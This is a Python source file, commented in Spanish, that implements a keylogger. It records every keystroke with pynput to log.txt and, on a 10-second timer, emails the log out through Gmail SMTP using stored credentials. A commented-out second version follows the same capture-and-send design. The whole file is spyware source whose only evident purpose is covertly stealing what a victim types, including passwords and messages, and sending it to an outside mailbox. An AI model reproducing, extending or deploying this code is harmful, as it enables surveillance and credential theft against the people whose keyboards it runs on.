from pynput.keyboard import Listener
import threading
import smtplib
import Constants as C
from email.message import EmailMessage
import socket
from datetime import datetime

class KeyLogger():
    def __init__ (self):
        self.email = C.FROM
        self.password = C.PASSWORD

    def write_to_file(self, key):
        letter = str(key)
        letter = letter.replace("'", "")

        # para mejorar la lectura del documento de texto
        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"

        if letter == "Key.esc": 
            pass
        if letter == "\\x18": 
            pass 
        if letter == "\\x03": 
            pass
        if letter == "\\x16":
            pass 

        with open("log.txt", 'a') as f:
            f.write(letter)

    # Collecting events until stopped

    def report(self):
        try:    
            with open("log.txt","r") as file:
                self.send(self.email,self.password,file)
        except:
            pass

        timer = threading.Timer(10,self.report)
        timer.start()

    def send(email, pssd, mssg):
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, pssd)
            server.sendmail(email, email, mssg)
            server.quit()
    
    def start(self):
        with Listener(on_press=self.write_to_file) as l:
            self.report()
            l.join()

# class KeyLogger:

#     # se definen las variables iniciales del objeto

#     def __init__(self):
#         self.interval = C.TIME_INTERVAL
#         self.log = "KeyLogger has started..."
#         self.email = C.FROM
#         self.password = C.PASSWORD

#     # Crea el log donde se guardan las teclas que se han presionado

#     def append_to_log(self, string):
#         self.log = self.log + string

#     # Crea el Keylogger

#     def on_press(self, key):
#         try:
#             current_key = str(key.char)
#         except AttributeError:
#             if key == key.space:
#                 current_key = " "
#             elif key == key.esc:
#                 print("Exiting program...")
#                 return False
#             else:
#                 current_key = " " + str(key) + " "

#         self.append_to_log(current_key)


#     # Crea la estructura para el envio de los correos electrónicos

#     def send_mail(self, email, password, message):
#         server = smtplib.SMTP('smtp.gmail.com', 587)
#         server.starttls()
#         server.login(email, password)
#         server.sendmail(email, email, message,)
#         server.quit()

#     # Envia el correo 

#     def report_n_send(self):
#         send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
#         self.log = ""
#         timer = threading.Timer(self.interval, self.report_n_send)
#         timer.start()

#     # Inicializa el keylogger y el envio de correos

#     def start(self):
#         keyboard_listener = Listener(on_press = self.on_press)
#         with keyboard_listener:
#             self.report_n_send()
#             keyboard_listener.join()